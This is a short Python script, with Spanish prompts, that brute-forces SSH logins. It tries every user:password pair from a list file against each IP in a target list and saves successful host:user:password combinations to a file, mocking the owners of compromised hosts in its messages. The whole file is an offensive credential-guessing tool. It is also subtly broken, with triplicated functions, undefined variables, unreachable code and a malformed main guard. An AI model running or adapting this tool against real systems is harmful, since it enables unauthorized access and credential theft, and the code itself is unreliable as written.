import chilkat
 
err_conn = 0
err_auth = 0
find=[]
findx=[]
 
 
 
def write(ll,filex):
    xx = open(filex,"w")
    for ii in ll:
        xx.write(ii+'\n')
    
    xx.close()
 
def read(lst,tupple):
    x = open(lst,"r")
    ll = x.readlines()
    for ii in ll:
        aa = ii.rstrip("\n")
        tupple.append(aa)
 
def read(filex,list):
    x = open(filex,'r')
    ll = x.readlines()
    for ii in ll:
        ii.rstrip('\n')
        listx.append(ii)
 
 
 
 
 
def read(filex,list):
    x = open(filex,"r")
    ll = x.readlines()
    for ii in ll:
        ii.rstrip('\n')
        listx.append(ii)
 
def ssh_conn(ip,port):
    ssh = chilkat.CkSsh()
    conn = ssh.Connect(ip,port)
    if conn == False:
        print("ERROR CONNECT -->");err_conn+=1;print(err_conn);return False
    if conn == True:
        return True
    ssh.Disconnect()
 
def ssh_auth(ip,usr,psw,port=22):
    ssh = chilkat.CkSsh()
    conn = ssh.Connect(ip,port)
    auth = ssh.AuthenticatePw(usr,psw)
    if auth == True:
        cred = usr+':'+psw
        print("###FIND###\n"+cred+"\n###FIND###\n");return True
        find.append(cred)
    if auth != True:
        print("F AUTH! (HABER ESTUDIADO)--->")
    ssh.Disconnect()
 
 
def main():
    ips=[]
    crd=[]
    i0 = input("PON EL FICHERO RETRASADO ( as list.txt)")
    i1 = str(i0)
    read(i1,ips)
    ii0 = input("ARCHIVO DE USR/PSW ( list.txt)\n\nFORMATO --> \n\nusr:psw\nusr:psw\n\n")
    ii1 = str(ii0)
    read(ii1,crd)
    i = 0
    while len(ips) > i:
        for ip in ips:
            if ssh_conn(ip,22) == True:
                ii_crd = 0
                while len(crd) > ii_crd:
                    print(f'UN TONTO ENCONTRADO :) ---> {len(findx)}')
                    print(findx)
                    if ssh_auth(ip,crd[ii_crd].split(":")[0],crd[ii_crd].split(":")[1]) == True:
                        combo = ip+':'+crd[ii_crd].split(":")[0]+':'+crd[ii_crd].split(":")[1]
                        findx.append(combo)         
                        break
 
                    ii_crd+=1
 
 
        i+=1
        write(findx,'find_bruteforce_ssh.txt')
        print("SCAN EASY ;)")
        break
 
if __name__ == main():
    main()